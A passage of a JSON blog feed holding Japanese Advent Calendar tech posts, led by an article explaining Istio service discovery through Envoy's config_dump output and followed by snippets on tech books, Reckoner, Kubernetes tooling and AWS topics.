にリクエストを送信します。この時、送信元マイクロサービスがistio-proxyコンテナに直接的にリクエストを送信しているというよりは、iptablesがistio-proxyコンテナにリクエストをリダイレクトします。istio-proxyコンテナこれを受信します。【５】istio-proxyコンテナは、リクエストをロードバランシングし、宛先Podにこれを送信します。↪️ 参考：Amazon | Istio in Action | Posta, Christian E., Maloku, Rinor | Software DevelopmentJimmy Song - 专注于探索后 Kubernetes 时代的云原生新范式Tech-赵化冰的博客 | Zhaohuabing Blogdiscoveryコンテナの仕組みdiscoveryコンテナを詳しく見てみましょう。discoveryコンテナは、別名Istiodと呼ばれています。XDS-APIというエンドポイントを公開しており、XDS-APIのうち、サービスディスカバリーに関係するAPIは以下の通りです。 APIの種類  説明                                                   LDS-API    Envoyのリスナー値を取得できる。                        RDS-API    Envoyのルート値を取得できる。                          CDS-API    Envoyのクラスター値を取得できる。                      EDS-API    Envoyのエンドポイント値できる。                        ADS-API    各XDS-APIから取得できる宛先情報を整理して取得できる。 discoveryコンテナは、kube-apiserverからPod等の宛先情報を取得して自身のメモリ上に保管し、各XDS-APIから提供します。XDS-APIとistio-proxyコンテナの間では、gRPCの双方向ストリーミングRPCの接続が確立されています。そのため、istio-proxyコンテナからのリクエストに応じて宛先情報を返却するだけでなく、リクエストがなくとも、XDS-APIからもistio-proxyコンテナに対して宛先情報を送信します。各種XDS-APIから個別に宛先情報を取得できますが、Envoy上で宛先情報のバージョンの不整合が起こる可能性があるため、Istioでは実際にはADS-APIを使用しています。↪️ 参考：Amazon | Istio in Action | Posta, Christian E., Maloku, Rinor | Software Developmentistio-proxyコンテナの仕組みistio-proxyコンテナを詳しく見てみましょう。istio-proxyコンテナでは、pilot-agentとEnvoyが稼働しています。先ほどistio-proxyコンテナは、双方向ストリーミングRPCでADS-APIから宛先情報を取得すると説明しました。厳密にはEnvoyが、pilot-agentを介して、ADS-APIから双方向ストリーミングRPCで宛先情報を取得します。istio-proxyコンテナが送信元マイクロサービスからリクエストを受信すると、EnvoyはADS-APIから取得した宛先情報に基づいて、宛先マイクロサービスのインスタンスにロードバランシングします。↪️ 参考：Amazon | Istio in Action | Posta, Christian E., Maloku, Rinor | Software DevelopmentJimmy Song - 专注于探索后 Kubernetes 时代的云原生新范式Tech-赵化冰的博客 | Zhaohuabing Blog04. istio-proxyコンテナ内のEnvoyの仕組みEnvoyの処理の流れEnvoyがADS-APIから取得した宛先情報を見ていく前に、Envoyの処理の流れを解説します。istio-proxyコンテナ内のEnvoyでは、以下の仕組みでリクエストを処理します。全体像【１】 〜 【６】の全体像は、以下の通りです\uD83D\uDC47【１】istio-proxyコンテナは、送信元マイクロサービスからリクエストを受信します。【２】Envoyは、リクエストの宛先情報 (例：宛先IPアドレス、ポート番号、パス、ホスト、など) に応じてリスナー値を選びます。【３】Envoyは、リスナーに紐づくルート値を選びます。【４】Envoyは、クラスターに紐づくクラスター値を選びます。【５】Envoyは、クラスターに紐づくエンドポイント値を選びます。【６】Envoyは、エンドポイント値に対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。↪️ 参考：Amazon.co.jp: Istio in Action (English Edition) 電子書籍: Posta, Christian E., Maloku, Rinor: 洋書Amazon | Istio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe | Calcote, Lee, Butcher, Zack | Design Tools & TechniquesArchitecture Analysis of Istio: The Most Popular Service Mesh Project - Alibaba Cloud CommunityEnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSONで取得できます。ただし、JSONだと見にくいので、yqコマンドでYAMLに変換すると見やすくなります。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください\uD83D\uDC4D\uD83C\uDFFB$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -Pリスナー値▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナー値は、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナー値を確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナー値を選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナー値に紐づくルート値の名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルート値の名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...↪️ 参考：Administration interface — envoy 1.26.0-dev-7cc893 documentationConfigDump (proto) — envoy 1.26.0-dev-7cc893 documentationルート値▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナー値は、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルート値を確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナー値を取得した時に確認できたルート値の名前リクエストのパスやホストヘッダーに応じてルート値を選べるようになっているルート値に紐づくクラスター値の名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルート値の名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスター値の名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...↪️ 参考：Administration interface — envoy 1.26.0-dev-7cc893 documentationConfigDump (proto) — envoy 1.26.0-dev-7cc893 documentationクラスター値▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスター値は、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスター値を確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルート値を取得した時に確認できたクラスター値の名前クラスター値に紐づくエンドポイント値の親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスター値の名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイント値の親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...↪️ 参考：Administration interface — envoy 1.26.0-dev-7cc893 documentationConfigDump (proto) — envoy 1.26.0-dev-7cc893 documentationエンドポイント値▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスター値は、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスター値を確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスター値を取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがあります全てのエンドポイントのload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします。configs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 80                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 80                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 80                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...↪️参考：Administration interface — envoy 1.26.0-dev-7cc893 documentationConfigDump (proto) — envoy 1.26.0-dev-7cc893 documentationSupported load balancers — envoy 1.26.0-dev-7cc893 documentationEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。【１】送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信し、サイドカーコンテナのistio-proxyコンテナはこれを受信します。【２】Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー値 (0.0.0.0_50002) を選びます。【３】Envoyは、リスナーに紐づくPodのルート値 (50002) を選びます。【４】Envoyは、クラスターに紐づくPodのクラスター値 (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。【５】Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント値 (11.0.0.X/:80) を選びます。【６】Envoyは、エンドポイント値の宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の一つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。Istioへの愛が溢れてしまいました。ここまで見ていただいたそこのあなた、片足が沼に浸かってます\uD83D\uDE0F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に、発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍♂️","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/25/060000","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常…","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"SREとして2022年読んでよかった技術書7選","contentSnippet":"はじめに2022年もそろそろ終わります。今年も技術書をたくさん読めました。技術的にはDevOpsやSRE、バックエンドに興味があります。この1年で10kg以上痩せたので冬がとても寒い。今年、読んだ技術書の中からおすすめの7冊を紹介します。順番に意味はないです。なぜ、今年は読んでよかった技術書7選なんてやろうと思ったかというと、元々はRecommend Tech Book でO\'Reilly Safariで読んで良かった技術書をまとめていました。しかし、6月末でACM経由のO\'Reilly Online Learning Platformを利用できなくなり、更新も止まりました。非常に悲しいですが今はO\'Reilly Online Learning Platformを利用しておりません。また、機会があれば入会すると思います。あと大きな読書環境の変化としては物理本絶対主義を卒業して電子書籍で購入できるものは基本的にそちらに移行しました。どこかの誰かに「紙の本を読みなよ」と言われそうです。はじめに2022年に読んでよかった技術書実用 Go言語システム運用アンチパターンソフトウェアアーキテクチャ・ハードパーツ達人プログラマー(第2版): 熟達に向けたあなたの旅セキュア・バイ・デザイン 安全なソフトウェア設計継続的デリバリーのソフトウェア工学実践Vim 思考のスピードで編集しよう！終わりに2022年に読んでよかった技術書実用 Go言語実用 Go言語 ―システム開発の現場で知っておきたいアドバイス作者:渋川 よしき,辻 大志郎,真野 隼記オライリージャパンAmazonReal World HTTP、Goならわかるシステムプログラミングの著者を中心とした経験豊富なGopher達が書いた共著のGo言語のTips系の技術書である「実用 Go言語 ―システム開発の現場で知っておきたいアドバイス」です。本書の素晴らしい点は、「よりGoらしく書くには」「実用的なアプリケーションを書くには」という言葉に偽りがなく、Gopherとしてのノウハウが満載である点だと思う。Goに興味がある程度だったら他の本を読んだほうがいいと思います。が、Goらしいプログラムの書き方を知りたい人はこの本を読むといい。知らなくていい行が一つもないです。「実用Go言語」の作り方 - Forkwell Library #7 というイベントもあったのであわせて紹介しておきます。forkwell.connpass.comシステム運用アンチパターンシステム運用アンチパターン ―エンジニアがDevOpsで解決する組織・自動化・コミュニケーション作者:Jeffery D. SmithオライリージャパンAmazonOperations Anti-Patterns, DevOps Solutions の訳本で「システム運用アンチパターン エンジニアがDevOpsで解決する組織・自動化・コミュニケーション」です。本書はタイトルからしてシステム運用に関するアンチパターンについて書かれた本ではあるが、私はむしろ、新人やシステム運用分からんマンこそ読むべき本だと思う。それくらい分かりやすく、DevOpsの基本が書かれている。本書の感想に関しては以前、読書感想文としてブログにしていたので参照ください。syu-m-5151.hatenablog.comシステム運用アンチパターン - Forkwell Library #4 というイベントもあったのであわせて紹介しておきます。forkwell.connpass.comソフトウェアアーキテクチャ・ハードパーツソフトウェアアーキテクチャ・ハードパーツ ―分散アーキテクチャのためのトレードオフ分析作者:Neal Ford,Mark Richards,Pramod Sadalage,Zhamak DehghaniオライリージャパンAmazonSoftware Architecture: The Hard Parts の訳本で「ソフトウェアアーキテクチャ・ハードパーツ ―分散アーキテクチャのためのトレードオフ分析」です。著者陣の前作『ソフトウェアアーキテクチャの基礎』も非常によい。というか殆どのエンジニアがまずはこっちを読むべきだと思ってます。『ソフトウェアアーキテクチャの基礎』の感想に関しては以前、読書感想文としてブログにしていたので参照ください。syu-m-5151.hatenablog.com本書はソフトウェアの厄介なトレードオフがある中で適切なアーキテクチャを選定するために必要となる「選択肢や考え方を提供」してくれる本です。今、マイクロサービスアーキテクチャ 第2版読んでいるがどちらともマイクロサービスに「賛成」でも「反対」でもないという中立的な立場から語られるので非常に読んでて気持ちが良い。マイクロサービスについて興味があるが導入するか悩んでる人は是非、読んでも損がないと思える一冊です。ソフトウェアアーキテクチャ・ハードパーツ - Forkwell Library #12 というイベントもあったのであわせて紹介しておきます。forkwell.connpass.com達人プログラマー(第2版): 熟達に向けたあなたの旅達人プログラマー ―熟達に向けたあなたの旅― 第2版作者:David Thomas,Andrew Huntオーム社AmazonThe Pragmatic Programmer 20th Anniversary Edition の訳本で「達人プログラマー(第2版): 熟達に向けたあなたの旅」です。我々は日々、生産性を求められている。いくら、加速文化の重圧に対抗するとは思いながら、ソフトウェア業界で働く以上は限界がある。現代は常に変化を求められ、「変わらなければ生き残れない」というのは事実だ(と信じている)。本書は、より効率的、生産的なプログラマーになりたいと願う人に対して実践的で素晴らしいTipsを紹介してくれる書籍です。プリンシプル オブ プログラミングやベタープログラマ を読んで良いと思った人は本書もハマると思う。技術者と作業員というポストにおける技術者として圧倒的な能力で問題解決ができることは理想。そして、理想には定期的に自我が殺される。本書は技術者に我々、作業員が迫る為の術をひたすら書いている。私は本書を読んで人生が楽しくなった。ソフトウェアエンジニアとしての自己啓発が足りない場合には読むことがある。エンジニアの自己啓発本です。セキュア・バイ・デザイン 安全なソフトウェア設計セキュア・バイ・デザイン 安全なソフトウェア設計作者:Dan Bergh Johnsson,Daniel Deogun,Daniel Sawanoマイナビ出版AmazonSecure by Design の訳本で「セキュア・バイ・デザイン 安全なソフトウェア設計」です。システムの設計時にセキュリティだけを切り出して別問題として考えるのではなく、システム全体の関心事として扱い、設計時に考慮するための思考方法を提供してくれる書籍です。以前、読書感想文としてブログにしていたので参照ください。DevOps的なことをいうと三部だけになりますが2030年にはセキュリティの専門家もシステム設計時からシステムに関わります(適当)。なので、セキュリティに関わる職域を目指したいという方は読むべきだと思います。syu-m-5151.hatenablog.com継続的デリバリーのソフトウェア工学継続的デリバリーのソフトウェア工学　もっと早く、もっと良いソフトウェアを作るための秘訣作者:David Farley日経BPAmazonModern Software Engineering : Doing What Works to Build Better Software Faster の訳本で「継続的デリバリーのソフトウェア工学　もっと早く、もっと良いソフトウェアを作るための秘訣」です。「ウェブオペレーション ―サイト運用管理の実践テクニック」は新人の時に読んでおいて良かったと思える一冊です。この本で私はシステムの運用が技芸だと教わりました。本書は継続的デリバリーを技芸からソフトウェア工学に取り戻そうとしている。「はじめに」が無料で公開されているのでぜひ、読んでください。bookplus.nikkei.com実践Vim 思考のスピードで編集しよう！実践Vim　思考のスピードで編集しよう！ (アスキー書籍)作者:Ｄｒｅｗ Ｎｅｉｌ,新丈 径角川アスキー総合研究所AmazonVimのコア機能を使いこなす手法に特化した本書。Editorはソフトウェアと触れ合う時の私の手の延長です。もっと、プログラミングが上手くなりたい。だから、使っているVim の達人になりたいとも考えている。なので、読んでいる。Tips集なのでやっていけば勝手に強くなる。思考のスピードを超えないように注意が必要だとは思っています。自分が好きなEditorを利用すれば良いと思っている。syu-m-5151.hatenablog.com終わりに他にも面白かった技術書はたくさんあるが発表やブログにしたものから厳選しました。これを書きながら技術書を読んでよかったと思えるのは常に自分の能力がその書籍を装備できるまでレベルが上がってからだなって思いました。ちなみに、3-shake Advent Calendar 2022の予備で途中まで書いていたブログです。皆さんが勤勉なので書くことにはなりませんでしたが人生で振り返ることが大事なので振り返ってみました。","link":"https://syu-m-5151.hatenablog.com/entry/2022/12/22/202944","isoDate":"2022-12-22T11:29:44.000Z","dateMiliSeconds":1671708584000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"kube-prometheus-stackでPrometheusを構築する","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 21日目の記事です。株式会社スリーシェイクに入社して3ヶ月が経ちました。今までアウトプット活動をあまりしてこなかったの…","link":"https://qiita.com/ys1/items/fcb430b15ae7c4fa8b47","isoDate":"2022-12-20T22:02:16.000Z","dateMiliSeconds":1671573736000,"authorName":"Yusuke Sakurai","authorId":"ysakurai"},{"title":"Dagger Go SDK でポータブルな CI/CD パイプラインを構築する","contentSnippet":"CI/CD Advent Calendar 2022 の 20 日目の記事です。https://qiita.com/advent-calendar/2022/cicd先日「3-shake SRE Tech Talk 2022 クリスマス直前会！」というイベントで Dagger についての話をしてきました。この記事では上記イベントで発表した内容+αについて改めてまとめます。 Dagger とはhttps://dagger.io/Dagger はコンテナで実行されるパイプラインを構築するプログラマブルな CI/CD エンジンです。Docker の創始者である Solomon ...","link":"https://zenn.dev/kou_pg_0131/articles/dagger-go-sdk","isoDate":"2022-12-20T10:00:09.000Z","dateMiliSeconds":1671530409000,"authorName":"Koki Sato","authorId":"kokisato"},{"title":"Reckonerを使ってGitHub名寄せ表をつくってみた","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 19日目の記事です。dogggggoさんによる Config Controller でポリシー制御をしながら Google Cloud のリソースを管理するでした。いきなりですが、Reckonerをご存知でしょうか。3-shakeが提供しているノーコード型ETLツール/データ連携ツールです。ベンチャー企業の課題Reckonerに触れる前に経緯や前段の話を少しします。Reckonerを触ってみるさぁReckonerを触っていくぞ！となったものの、いきなりチーム単位で導入して使っていくのは難しいというのは経験上わかっていました。新しいことやるのにパワーは必要です。最初が肝心なので勢いよく開発メンバーのいるSlackチャンネルに突撃しました。ユーザー目線でReckonerを触ってみてわかった機能は以下。接続できるアプリケーションがあらかじめ用意されている接続できるアプリケーションは認証情報を設定するだけでデータを引っ張ってくることができる対応していないアプリケーションやサービスはHTTPリクエストを書くことができるHTTPレスポンスはcsvやJSON形式で扱うことができ、JSON Pathsでパースすることができる接続できるアプリケーションにはGoogle Spreadsheetを始め、DWHやDB、KintoneやSlackなんかも使えたりします。いくつかのHTTPリクエストを試してみて認証付きAPIを叩けることが確認できたのでサンプルで何か作ってみようかなーと考えたのですが、情シスのHello Worldをやることにしました。GitHub名寄せ表です。GitHub名寄せ表をReckonerでつくってみるではお題が決まったところでさっそくつくっていきましょう。GitHub APIを叩くGoogle Spreadsheetに書き込むGitHub APIを叩くところを用意Reckonerのワークフローを開き、HTTPを配置すると入力画面が出てくるので必要な情報を入れます。必要なヘッダについてはこちら。            APIエンドポイントやヘッダのパラメータ            JSON Pathsはこんな感じで書きますプレビューで設定したパラメータでレスポンスが受け取れているかが確認できるので、よければ保存しておきます。            APIリクエストが成功すれば結果が表示されますこれでGitHubのmembersが取れるようになりました。Google Spreadsheetの準備まずはGitHubアカウントを書き込むためのGoogle Spreadsheetを準備しておきます。            スプレッドシートIDはGoogle SpreadsheetのURLから取得したものを入れます            APIリクエストが成功すれば結果が表示されますOrganizationに入れたGitHubアカウントを追記するようにするしかしながら、ここまでで用意したものだとAPIで取れたデータを毎回上書きすることになってしまって使い物になりません。ReckonerはETLなのでデータの加工も当然ながらできます。今回はGoogle SpreadsheetとGitHub APIの差分を取って、それをInsertするようにします。            変換の差分機能を使います差分機能を使うことで新たにInviteされたGitHubアカウントを抽出することができます。            データ取得 → 差分 → Insertのフロー完成こうすることで日々運用でOrganizationにGitHubアカウントを追加してもSpreadSheetに書き込まれます。            InsertされたGitHubアカウントにメールアドレスを添えてあげれば名寄せ表は完成見事ノーコードでGitHub名寄せ表がつくれましたね。最初は使い方を覚える必要がありますが、それさえ出来てしまえば欲しいデータが簡単につくれました。いかがでしたでしょうか。簡単ではありますがETLツールReckonerを紹介しました。無料トライアルにチャレンジしてみてください。新料金プランが用意されたようなのでこちらもチェックしてみてください。","link":"https://blog.jigyakkuma.org/2022/12/19/reckoner-howto/","isoDate":"2022-12-18T15:00:00.000Z","dateMiliSeconds":1671375600000,"authorName":"Shinji Yamada","authorId":"jigyakkuma"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ^1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2…","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"Casbinで学ぶアクセス制御モデルRBAC","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 15日目の記事です。自己紹介サーバーサイドメイン（フロント、インフラチョットだけ）で18年くらいエンジニアやってます…","link":"https://qiita.com/bayobayo0324/items/d0559608c99447b9fdbc","isoDate":"2022-12-14T22:03:46.000Z","dateMiliSeconds":1671055426000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"Descheduler for Kubernetes で Pod の再配置","contentSnippet":"背景 ある案件で以下のような小規模な Kubernetes クラスタを運用していました。 Kubernetes には hoge というアプリケーションをデプロイしている hoge アプリケーションを乗せる用のノードは2ノ […]The post Descheduler for Kubernetes で Pod の再配置 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-descheduler/","isoDate":"2022-12-13T00:46:47.000Z","dateMiliSeconds":1670892407000,"authorName":"Sreake","authorId":"Sreake"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"TypeScriptなGraphQLサーバをGoにリプレースした","contentSnippet":"TypeScriptなGraphQLサーバをGoにリプレースした3-shake Advent Calendar 2022の11日目です。現在携わっているプロダクトではGraphQLを利用してフロント/バックエンドの通信を行っています。7月に入社した当初はTypeScriptで開発が進んでおり、ある程度の機能が出揃っていましたが、チーム編成が変わったことによりGoが得意なメンバーがバックエンドを担当することになりました。そこで既存のGraphQLサーバをGoにリプレースしたのでまとめます。 これまで既存のGraphQLサーバはTypeScriptをベースに構成されており、...","link":"https://zenn.dev/pranc1ngpegasus/articles/7c3013bb132437","isoDate":"2022-12-10T22:00:00.000Z","dateMiliSeconds":1670709600000,"authorName":"Temma Fukaya","authorId":"Pranc1ngPegasus"},{"title":"AWS Control Towerを調べる","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing 